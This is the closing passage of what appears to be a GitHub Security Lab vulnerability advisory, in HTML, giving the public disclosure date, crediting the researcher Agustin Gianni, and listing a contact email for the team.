  <li>02/26/2020: Report published to public</li>
  <li>
    <h2 id="credit">Credit</h2>
  </li>
</ul>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/agustingianni">@agustingianni (Agustin Gianni)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include the <code class="language-plaintext highlighter-rouge">GHSL-YEAR-ID</code> in any communication regarding this issue.</p>

